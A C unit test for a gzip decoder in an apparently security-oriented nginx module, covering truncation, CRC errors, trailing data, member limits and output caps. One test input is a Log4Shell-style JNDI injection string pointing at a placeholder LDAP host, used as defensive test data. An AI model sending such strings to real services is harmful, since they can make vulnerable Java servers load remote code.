/* Copyright (C) 2026 Thijs Eilander
 * SPDX-License-Identifier: BSD-2-Clause */
#undef NDEBUG
#include <assert.h>
#include <stdio.h>
#include <time.h>
#include "../../src/ngx_http_shield_gzip.h"

static union {
    ngx_shield_gzip_align_t align;
    unsigned char bytes[NGX_SHIELD_GZIP_ARENA];
} arena;

static size_t
compress_gzip(const unsigned char *input, size_t length, unsigned char *output,
    size_t capacity)
{
    z_stream z;
    size_t written;
    memset(&z, 0, sizeof(z));
    assert(deflateInit2(&z, 6, Z_DEFLATED, 31, 8, Z_DEFAULT_STRATEGY) == Z_OK);
    z.next_in = (Bytef *) input;
    z.avail_in = (uInt) length;
    z.next_out = output;
    z.avail_out = (uInt) capacity;
    assert(deflate(&z, Z_FINISH) == Z_STREAM_END);
    written = capacity - z.avail_out;
    assert(deflateEnd(&z) == Z_OK);
    return written;
}

int main(void)
{
    unsigned char input[70000], saved[70000], output[8193], plain[65536];
    const unsigned char attack[] = "value=${jndi:ldap://fixture.invalid/x}";
    ngx_shield_gzip_result_t result;
    size_t length, i, n;
    clock_t started;

    for (i = 0; i < 2; i++) {
        const unsigned char *text = i == 0 ? (unsigned char *) "hello" : attack;
        n = i == 0 ? 5 : sizeof(attack) - 1;
        length = compress_gzip(text, n, input, sizeof(input));
        memcpy(saved, input, length);
        result = ngx_shield_gzip_decode(input, length, output, n + 1,
                                       arena.bytes, sizeof(arena.bytes));
        assert(result.state == NGX_SHIELD_GZIP_COMPLETE);
        assert(result.consumed == length && result.produced == n);
        assert(result.zstatus == Z_STREAM_END);
        assert(memcmp(output, text, n) == 0);
        assert(memcmp(input, saved, length) == 0);
        assert(result.allocated <= NGX_SHIELD_GZIP_ARENA);
        assert(result.allocations > 0 && result.allocations <= 2);
        result = ngx_shield_gzip_decode(input, length - 1, output, sizeof(output),
                                       arena.bytes, sizeof(arena.bytes));
        assert(result.state == NGX_SHIELD_GZIP_TRUNCATED);
        assert(result.consumed == length - 1 && result.produced == n);
        input[length - 8] ^= 1; /* CRC mismatch */
        result = ngx_shield_gzip_decode(input, length, output, sizeof(output),
                                       arena.bytes, sizeof(arena.bytes));
        assert(result.state == NGX_SHIELD_GZIP_INVALID);
        memcpy(input, saved, length);
        input[length] = 'x';
        result = ngx_shield_gzip_decode(input, length + 1, output, sizeof(output),
                                       arena.bytes, sizeof(arena.bytes));
        assert(result.state == NGX_SHIELD_GZIP_TRAILING);
        assert(result.consumed == length && result.produced == n);
        for (n = 0; n < length - 8; n++) {
            result = ngx_shield_gzip_decode(saved, n, output, sizeof(output),
                                           arena.bytes, sizeof(arena.bytes));
            assert(result.state == NGX_SHIELD_GZIP_TRUNCATED);
            assert(result.consumed <= n);
        }
    }
    input[length] = 0;
    result = ngx_shield_gzip_decode(input, length + 1, output, sizeof(output),
                                   arena.bytes, sizeof(arena.bytes));
    assert(result.state == NGX_SHIELD_GZIP_COMPLETE);
    assert(result.consumed == length + 1);
    memcpy(input + length + 1, input, length);
    result = ngx_shield_gzip_decode(input, length * 2 + 1, output, sizeof(output),
                                   arena.bytes, sizeof(arena.bytes));
    assert(result.state == NGX_SHIELD_GZIP_COMPLETE);
    assert(result.consumed == length * 2 + 1 && result.members == 2);
    assert(result.calls == 2 && result.allocations <= 2);
    result = ngx_shield_gzip_decode(input, length * 2 + 1, output,
                                   sizeof(attack) - 1,
                                   arena.bytes, sizeof(arena.bytes));
    assert(result.state == NGX_SHIELD_GZIP_LIMIT);
    assert(result.produced == sizeof(attack) - 1 && result.members == 1);
    assert(result.consumed == length + 1);
    result = ngx_shield_gzip_decode(input, length, output, sizeof(output),
                                   arena.bytes, 1);
    assert(result.state == NGX_SHIELD_GZIP_ERROR);
    assert(result.zstatus == Z_MEM_ERROR && result.allocations == 0);
    result = ngx_shield_gzip_decode(input, length, output, 0,
                                   arena.bytes, sizeof(arena.bytes));
    assert(result.state == NGX_SHIELD_GZIP_ERROR);
    length = compress_gzip((unsigned char *) "", 0, input, sizeof(input));
    for (i = 1; i <= NGX_SHIELD_GZIP_MAX_MEMBERS; i++) {
        memcpy(input + i * length, input, length);
    }
    result = ngx_shield_gzip_decode(input,
                 length * (NGX_SHIELD_GZIP_MAX_MEMBERS + 1), output,
                 sizeof(output), arena.bytes, sizeof(arena.bytes));
    assert(result.state == NGX_SHIELD_GZIP_MEMBER_LIMIT);
    assert(result.members == NGX_SHIELD_GZIP_MAX_MEMBERS);
    assert(result.calls == NGX_SHIELD_GZIP_MAX_MEMBERS);
    assert(result.produced == 0 && result.allocations <= 2);
    memset(plain, 'a', sizeof(plain));
    length = compress_gzip(plain, sizeof(plain), input, sizeof(input));
    started = clock();
    result = ngx_shield_gzip_decode(input, length, output, sizeof(output),
                                   arena.bytes, sizeof(arena.bytes));
    assert(result.state == NGX_SHIELD_GZIP_LIMIT);
    assert(result.produced == sizeof(output) && result.consumed <= length);
    printf("gzip cap: input=%zu consumed=%zu output=%zu arena=%zu allocations=%zu cpu_us=%.1f zlib=%s\n",
           length, result.consumed, result.produced, result.allocated,
           result.allocations, 1000000.0 * (clock() - started) / CLOCKS_PER_SEC,
           zlibVersion());
    puts("gzip_unit: complete/exact-fit/attack/truncated/CRC/trailing/cap/allocation-error passed");
    return 0;
}
